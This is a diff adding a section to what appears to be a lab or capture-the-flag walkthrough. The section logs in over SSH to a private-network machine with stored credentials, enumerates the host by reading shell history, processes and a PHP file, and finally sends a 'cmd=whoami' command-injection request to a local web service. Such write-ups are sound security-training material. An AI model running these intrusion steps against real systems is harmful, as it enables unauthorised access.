@@ -167,3 +167,55 @@ burpsuite &> /dev/null & disown
 
 User:    jehad<br>
 Passwd:  fool
+
+<h2><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>PORT 22</h2>
+
+```bash
+ssh jehad@192.168.1.210
+```
+![image](https://github.com/user-attachments/assets/bacade7e-5272-4a69-8ae2-8369d12ad233)
+
+### **TTY treatment**
+```bash
+reset xterm
+export TERM=xterm
+export SHELL=bash
+```
+![image](https://github.com/user-attachments/assets/7542a396-ea4c-4f30-aa72-6af74444a298)
+
+```bash
+cat .bash_history
+```
+![image](https://github.com/user-attachments/assets/23c718d1-d55a-4f23-bf80-6eda02664205)
+
+```bash
+netstat -nat
+```
+![image](https://github.com/user-attachments/assets/949ada36-6c76-4a97-a8c6-4da4d7babddf)
+
+```bash
+ps -faux | grep 9999
+```
+![image](https://github.com/user-attachments/assets/73a1d181-2f51-414b-82f6-6440353bf93f)
+
+```bash
+cat index.php
+```
+![image](https://github.com/user-attachments/assets/d3c6ee07-90ba-4745-99c4-e58d0d2ed592)
+
+```bash
+curl "http://localhost:9999/index.php?cmd=whoami" -X GET; echo
+```
+![image](https://github.com/user-attachments/assets/06e3a4e0-f8a0-4555-b951-e134a1c07a2e)
+
+
+
+
+
+
+
+
+
+
+
+
